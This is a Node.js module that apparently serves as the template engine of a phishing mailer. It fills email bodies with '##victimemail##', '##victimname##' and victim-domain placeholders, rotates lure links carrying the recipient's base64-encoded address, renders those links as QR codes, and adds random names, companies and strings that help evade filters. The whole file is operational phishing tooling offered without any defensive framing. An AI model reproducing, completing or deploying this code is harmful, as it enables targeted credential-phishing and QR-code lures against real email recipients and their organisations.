#!/usr/bin/env node
const fs = require('fs');
const QRCode = require('qrcode');

// Arrays to store data loaded from files
let firstNames = [];
let lastNames = [];
let companyNames = [];
let linksArray = [];
let wordsArray = [];
let words1Array = [];

// Initialize index variables
let linkIndex = 0;
let wordIndex = 0;

// Function to load data from a text file into an array
function loadFromFile(fileName) {
    try {
        const data = fs.readFileSync(fileName, 'utf8');
        return data.split('\n').map(item => item.trim()).filter(item => item !== '');
    } catch (error) {
        console.error(`Error reading ${fileName}:`, error);
        return [];
    }
}

// Load data from text files into arrays when the module is required
function loadData() {
    firstNames = loadFromFile('fnames.txt');
    lastNames = loadFromFile('lnames.txt');
    companyNames = loadFromFile('companyNames.txt');
    linksArray = loadFromFile('links.txt'); // Preserving placeholders in links
    wordsArray = loadFromFile('words.txt'); // Preserving placeholders in words
    words1Array = loadFromFile('words1.txt'); // Preserving placeholders in words1
}

loadData(); // Load data immediately when the module is required

// Generate a random number of specified length
function generateRandomNumber(count) {
    return Math.floor(Math.random() * Math.pow(10, count)).toString().padStart(count, '0');
}

// Generate a random string of specified length and type (lowercase or uppercase)
function generateRandomString(count, type) {
    const chars = type === 'lower' ? 'abcdefghijklmnopqrstuvwxyz' : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let randomString = '';
    for (let i = 0; i < count; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        randomString += chars.charAt(randomIndex);
    }
    return randomString;
}

// Function to translate common color names to hexadecimal codes
function translateColorNameToHex(colorName) {
    const colors = {
        black: '#000000',
        white: '#ffffff',
        red: '#ff0000',
        green: '#00ff00',
        blue: '#0000ff',
        yellow: '#ffff00',
        cyan: '#00ffff',
        magenta: '#ff00ff',
        blank: '#ffffff' // For convenience, map 'blank' to white
    };

    return colors[colorName.toLowerCase()] || colorName;
}

// Replace placeholders in content with actual values based on recipient's information
async function replacePlaceholders(content, recipient) {
    if (typeof content !== 'string') {
        console.error('Content must be a string.');
        return ''; // Guard clause to handle non-string content safely
    }

    if (typeof recipient !== 'string') {
        console.warn('Recipient must be a string. Converting to string.');
        recipient = recipient.toString();
    }

    const domain = recipient.split('@')[1] || 'defaultdomain.com';
    const name = recipient.split('@')[0] || 'defaultname';
    const domainParts = domain.split('.') || ['default', 'com'];

    // Check if content contains ##qrcode## placeholder
    let qrCodeDataUrl = '';
    let link = '';
    if (content.includes('##qrcode##')) {
        link = getNextLink(recipient);
        qrCodeDataUrl = await generateQRCodeDataUrl(link, 200); // Use default colors here
    }

    const placeholders = {
        '##date1##': new Date().toLocaleString('en-US', { timeZone: 'UTC' }),
        '##date##': new Date().toISOString(),
        '##date2##': new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }),
        '##time##': getFormattedTime(true),
        '##time1##': getFormattedTime(false),
        '##time2##': getFormattedTime(true, 'GMT'),
        '##randomfname##': getRandomItemFromArray(firstNames),
        '##randomlname##': getRandomItemFromArray(lastNames),
        '##randomcompany##': getRandomItemFromArray(companyNames),
        '##victimb64email##': Buffer.from(recipient).toString('base64'),
        '##words##': getNextWord(wordsArray),
        '##words1##': getNextWord(words1Array),
        '##victimemail##': recipient,
        '##victimname##': name.charAt(0).toUpperCase() + name.slice(1),
        '##victimdomain##': domain,
        '##victimdomain1##': domainParts[0].charAt(0).toUpperCase() + domainParts[0].slice(1),
        '##victimdomain2##': domainParts[0].toUpperCase(),
        '##victimdomain3##': `${domainParts[0].charAt(0).toUpperCase()}${domainParts[0].slice(1)}.${domainParts[1].toUpperCase()}`,
        '##victimdomain4##': domainParts[0].toLowerCase(),
        '##victimdomainlogo##': getDomainLogo(domain),
        '##link##': link || '',
        '##qrcode##': qrCodeDataUrl ? `<img src="${qrCodeDataUrl}" alt="QR Code">` : '',
    };

    // STEP 1: Replace num(count), stringlower(count), and stringupper(count) placeholders
    content = content.replace(/##num(\d+)##/g, (_, count) => generateRandomNumber(parseInt(count)));
    content = content.replace(/##stringlower(\d+)##/g, (_, count) => generateRandomString(parseInt(count), 'lower'));
    content = content.replace(/##stringupper(\d+)##/g, (_, count) => generateRandomString(parseInt(count), 'upper'));

    // STEP 2: Replace all regular placeholders first
    Object.keys(placeholders).forEach(key => {
        const regex = new RegExp(key, 'g');
        content = content.replace(regex, placeholders[key]);
    });

    // STEP 3: Now replace base64 placeholders (they contain already-processed content)
    content = content.replace(/##base64\((.*?)\)##/gs, (match, innerContent) => {
        return encodeToBase64(innerContent);
    });

    return content;
}

// Function to get a formatted time string
function getFormattedTime(includeSeconds, timeZone) {
    const options = { hour: '2-digit', minute: '2-digit' };
    if (includeSeconds) options.second = '2-digit';
    return new Date().toLocaleTimeString('en-US', { ...options, timeZone: timeZone || 'UTC' });
}

// Function to get a random item from an array
function getRandomItemFromArray(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Function to get the next word from an array in a circular manner
function getNextWord(array) {
    const word = array[wordIndex];
    wordIndex = (wordIndex + 1) % array.length; // Move to the next word, wrap around if needed
    return word;
}

// Function to get a domain logo representation (example implementation)
function getDomainLogo(domain) {
    if (domain.includes('microsoft.com')) {
        return 'Microsoft Logo';
    }
    return 'Generic Logo'; // Default logo for other domains
}

// Function to get the next link and replace placeholders in the link template
function getNextLink(recipient) {
    if (linksArray.length === 0) {
        console.error('No links found in the linksArray.');
        return '';
    }

    const linkTemplate = linksArray[linkIndex];
    let link = linkTemplate.replace('##victimb64email##', Buffer.from(recipient).toString('base64')).replace('##victimemail##', recipient);
    linkIndex = (linkIndex + 1) % linksArray.length; // Move to the next link, wrap around if needed
    return link;
}

// Function to generate a QR code for a given URL with size and color options
async function generateQRCodeDataUrl(url, size = 50, color = { dark: 'black', light: 'white' }) {
    if (!url) {
        console.error('No URL provided for QR code generation.');
        return '';
    }

    try {
        const darkColor = translateColorNameToHex(color.dark);
        const lightColor = translateColorNameToHex(color.light);

        const qrCodeDataUrl = await QRCode.toDataURL(url, {
            width: size,
            color: {
                dark: darkColor, // Color of the QR code
                light: lightColor // Background color of the QR code
            }
        });
        return qrCodeDataUrl; // Return the data URL for the QR code
    } catch (error) {
        console.error('Error generating QR code:', error);
        return '';
    }
}

// Function to encode any string to base64
function encodeToBase64(str) {
    // First, process any nested placeholders in the content
    const processedContent = str.replace(/##(.*?)##/g, (match, placeholder) => {
        // You might need to handle nested placeholders here if needed
        return match; // For now, return as-is, but you can add recursive processing if needed
    });
    return Buffer.from(processedContent).toString('base64');
}

// Function to generate a base64 encoded number of specified length
function generateBase64Number(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

module.exports = {
    replacePlaceholders,
    generateQRCodeDataUrl
};